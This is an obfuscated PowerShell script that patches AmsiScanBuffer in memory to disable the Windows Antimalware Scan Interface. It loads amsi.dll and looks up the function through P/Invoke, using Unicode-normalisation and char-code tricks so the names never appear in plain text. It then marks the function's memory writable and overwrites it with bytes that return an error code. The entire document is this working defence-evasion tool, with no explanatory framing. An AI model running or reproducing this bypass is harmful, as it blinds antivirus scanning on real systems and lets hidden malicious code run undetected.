$TekFtDABH3 = @"
using System;
using System.Runtime.InteropServices;
public class TekFtDABH3 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr UrkX39CE, string D6TeuE5A24DDM9qIE);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr KVhv7kqskyl, UIntPtr ZqXlb1kKfwcrxq01N5, uint r5Sp4sA0OZLp, out uint b5Exr3QH1avtLNs2mh);
}
"@

Add-Type $TekFtDABH3

$ySmOXtZzp3q2 = [TekFtDABH3]::LoadLibrary("$(('â'+'m'+'s'+'ì'+'.'+'d'+'l'+'l').NoRMaLizE([CHaR](22+48)+[chaR]([bytE]0x6f)+[cHAr]([bYte]0x72)+[CHaR]([bYTE]0x6d)+[chAR](68+56-56)) -replace [cHaR](92)+[CHar]([bytE]0x70)+[cHar](123)+[cHaR]([Byte]0x4d)+[ChaR](110+100-100)+[ChAr](125))")
$UyeGt = [TekFtDABH3]::GetProcAddress($ySmOXtZzp3q2, "$(('ÃmsìScãnBûff'+'èr').norMalIZe([CHar](70*60/60)+[CHAR](111*99/99)+[CHaR](114*56/56)+[cHAr]([ByTe]0x6d)+[cHar]([BYTe]0x44)) -replace [ChAR](1+91)+[chAR]([BYte]0x70)+[cHAR](1+122)+[ChaR](59+18)+[ChAr]([BytE]0x6e)+[CHaR](125*65/65))")
$p = 0
[TekFtDABH3]::VirtualProtect($UyeGt, [uint32]5, 0x40, [ref]$p)
$d7rwwo06Lxc42_HL1xss = "0xB8"
$FOqNpv8JlB15ow = "0x57"
$G1Q_bQZOFhkQE4 = "0x00"
$igtlbX0cqG7yqPRmPLo_ = "0x07"
$QOhXMTSKe8Lx2pNe5UFh = "0x80"
$AsyNaGKuxA1viGObt = "0xC3"
$POuFwE9XIwUsizfF = [Byte[]] ($d7rwwo06Lxc42_HL1xss,$FOqNpv8JlB15ow,$G1Q_bQZOFhkQE4,$igtlbX0cqG7yqPRmPLo_,+$QOhXMTSKe8Lx2pNe5UFh,+$AsyNaGKuxA1viGObt)
[System.Runtime.InteropServices.Marshal]::Copy($POuFwE9XIwUsizfF, 0, $UyeGt, 6)